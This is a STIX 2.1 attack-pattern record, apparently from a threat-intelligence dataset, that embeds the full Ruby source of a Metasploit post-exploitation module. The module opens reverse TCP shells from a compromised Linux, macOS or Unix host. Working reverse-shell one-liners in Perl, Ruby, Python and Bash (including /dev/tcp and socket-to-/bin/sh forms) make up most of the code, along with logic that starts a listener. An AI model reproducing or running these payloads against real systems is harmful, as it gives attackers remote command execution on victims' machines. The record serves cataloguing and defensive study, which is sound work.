{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d7279d02-346a-4d04-8d77-32c43eeb29d5",
    "created": "2024-08-14T16:33:18.002267Z",
    "modified": "2024-08-14T16:33:18.00227Z",
    "name": "Multi Manage System Remote TCP Shell Session",
    "description": " This module will create a Reverse TCP Shell on the target system using the system's own scripting environments installed on the target.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/system_session.rb",
            "external_id": "system_session.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Manage System Remote TCP Shell Session',\n        'Description' => %q{\n          This module will create a Reverse TCP Shell on the target system\n          using the system's own scripting environments installed on the\n          target.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => %w[linux osx unix],\n        'SessionTypes' => [ 'meterpreter', 'shell' ]\n      )\n    )\n    register_options(\n      [\n        OptAddressLocal.new('LHOST',\n                            [true, 'IP of host that will receive the connection from the payload.']),\n        OptInt.new('LPORT',\n                   [false, 'Port for Payload to connect to.', 4433]),\n        OptBool.new('HANDLER',\n                    [ true, 'Start an exploit/multi/handler to receive the connection', false]),\n        OptEnum.new('TYPE', [\n          true, 'Scripting environment on target to use for reverse shell',\n          'auto', ['auto', 'ruby', 'python', 'perl', 'bash']\n        ])\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    create_multihand(datastore['LHOST'], datastore['LPORT']) if datastore['HANDLER']\n    lhost = datastore['LHOST']\n    lport = datastore['LPORT']\n    cmd = ''\n\n    begin\n      case datastore['TYPE']\n      when /auto/i\n        cmd = auto_create_session(lhost, lport)\n      when /ruby/i\n        cmd = ruby_session(lhost, lport)\n      when /python/i\n        cmd = python_session(lhost, lport)\n      when /perl/i\n        cmd = perl_session(lhost, lport)\n      when /bash/i\n        cmd = bash_session(lhost, lport)\n      end\n    rescue StandardError\n    end\n\n    if !cmd.empty?\n      print_status(\"Executing reverse tcp shell to #{lhost} on port #{lport}\")\n      cmd_exec(\"(#{cmd} &)\")\n    end\n  end\n\n  # Runs a reverse tcp shell with the scripting environment found\n  def auto_create_session(lhost, lport)\n    cmd = ''\n\n    if cmd_exec('perl -v') =~ /Larry/\n      print_status('Perl was found on target')\n      cmd = perl_session(lhost, lport)\n      vprint_status(\"Running #{cmd}\")\n\n    elsif cmd_exec('ruby -v') =~ /revision/i\n      print_status('Ruby was found on target')\n      cmd = ruby_session(lhost, lport)\n      vprint_status(\"Running #{cmd}\")\n\n    elsif cmd_exec('python -V') =~ /Python 2\\.(\\d)/\n      print_status('Python was found on target')\n      cmd = python_session(lhost, lport)\n      vprint_status(\"Running #{cmd}\")\n\n    elsif cmd_exec('bash --version') =~ /GNU bash/\n      print_status('Bash was found on target')\n      cmd = bash_session(lhost, lport)\n      vprint_status(\"Running #{cmd}\")\n    else\n      print_error('No scripting environment found with which to create a remote reverse TCP Shell with.')\n    end\n\n    return cmd\n  end\n\n  # Method for checking if a listner for a given IP and port is present\n  # will return true if a conflict exists and false if none is found\n  def check_for_listner(lhost, lport)\n    conflict = false\n    client.framework.jobs.each do |_k, j|\n      next unless j.name =~ %r{ multi/handler}\n\n      current_id = j.jid\n      current_lhost = j.ctx[0].datastore['LHOST']\n      current_lport = j.ctx[0].datastore['LPORT']\n      if (lhost == current_lhost) && (lport == current_lport.to_i)\n        print_error(\"Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}\")\n        conflict = true\n      end\n    end\n    return conflict\n  end\n\n  # Starts a exploit/multi/handler session\n  def create_multihand(lhost, lport)\n    pay = client.framework.payloads.create('generic/shell_reverse_tcp')\n    pay.datastore['LHOST'] = lhost\n    pay.datastore['LPORT'] = lport\n    print_status('Starting exploit/multi/handler')\n    if !check_for_listner(lhost, lport)\n      # Set options for module\n      mul = client.framework.exploits.create('multi/handler')\n      mul.share_datastore(pay.datastore)\n      mul.datastore['WORKSPACE'] = client.workspace\n      mul.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'\n      mul.datastore['EXITFUNC'] = 'thread'\n      mul.datastore['ExitOnSession'] = false\n      # Validate module options\n      mul.options.validate(mul.datastore)\n      # Execute showing output\n      mul.exploit_simple(\n        'Payload' => mul.datastore['PAYLOAD'],\n        'LocalInput' => user_input,\n        'LocalOutput' => user_output,\n        'RunAsJob' => true\n      )\n    else\n      print_error('Could not start handler!')\n      print_error('A job is listening on the same Port')\n    end\n  end\n\n  # Perl reverse TCP Shell\n  def perl_session(lhost, lport)\n    if cmd_exec('perl -v') =~ /Larry/\n      print_status('Perl reverse shell selected')\n      cmd = \"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET \" \\\n            \"(PeerAddr,\\\"#{lhost}:#{lport}\\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\"\n    else\n      print_error('No scripting environment found for the selected type.')\n      cmd = ''\n    end\n    return cmd\n  end\n\n  # Ruby reverse TCP Shell\n  def ruby_session(lhost, lport)\n    if cmd_exec('ruby -v') =~ /revision/i\n      print_status('Ruby reverse shell selected')\n      return \"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\\\"#{lhost}\\\",\\\"#{lport}\\\");\" \\\n             \"while(cmd=c.gets);begin;IO.popen(cmd,\\\"r\\\"){|io|c.print io.read};rescue;end;end'\"\n    else\n      print_error('No scripting environment found for the selected type.')\n      cmd = ''\n    end\n    return cmd\n  end\n\n  # Python reverse TCP Shell\n  def python_session(lhost, lport)\n    if cmd_exec('python -V') =~ /Python 2\\.(\\d)/\n      print_status('Python reverse shell selected')\n      return \"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,\" \\\n             \"socket.SOCK_STREAM);s.connect((\\\"#{lhost}\\\",#{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\" \\\n             \"os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\"\n    else\n      print_error('No scripting environment found for the selected type.')\n      cmd = ''\n    end\n    return cmd\n  end\n\n  # Bash reverse TCP Shell\n  def bash_session(lhost, lport)\n    if cmd_exec('bash --version') =~ /GNU bash/\n      print_status('Bash reverse shell selected')\n      return \"bash -c 'nohup bash -i >& /dev/tcp/#{lhost}/#{lport} 0>&1'\"\n    else\n      print_error('No scripting environment found for the selected type.')\n      cmd = ''\n    end\n    return cmd\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux osx unix]"
    ]
}